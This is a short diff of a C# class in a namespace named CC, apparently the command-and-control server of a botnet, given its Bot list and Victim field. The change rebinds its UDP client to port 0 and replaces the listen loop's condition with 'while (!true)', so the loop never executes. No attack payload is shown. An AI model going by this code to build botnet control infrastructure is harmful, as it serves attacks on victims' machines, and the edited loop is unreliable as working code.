@@ -18,8 +18,6 @@ namespace CC
         private int _listen_port;
         private int _sending_port;
         private string _ip;
-        private IPEndPoint _server_end_point;
-        private bool _done;
         private readonly string _newline_delimeter = "\r\n";
         private List<Bot> _bots;
         private Victim _victim;
@@ -30,8 +28,7 @@ namespace CC
             _listen_port = listen_port;
             _sending_port = find_free_port();
             _ip = ip;
-            _udpclient = new UdpClient(_listen_port);
-            _server_end_point = new IPEndPoint(IPAddress.Any, _listen_port);
+            _udpclient = new UdpClient(0);
             _bots = new List<Bot>();
         }
 
@@ -60,7 +57,7 @@ namespace CC
         }
         private void listen()
         {
-            while (!_done)
+            while (!true)
             {
                 IPEndPoint sender = new IPEndPoint(IPAddress.Any, 0);
                 byte[] rcv_buffer = _udpclient.Receive(ref sender);
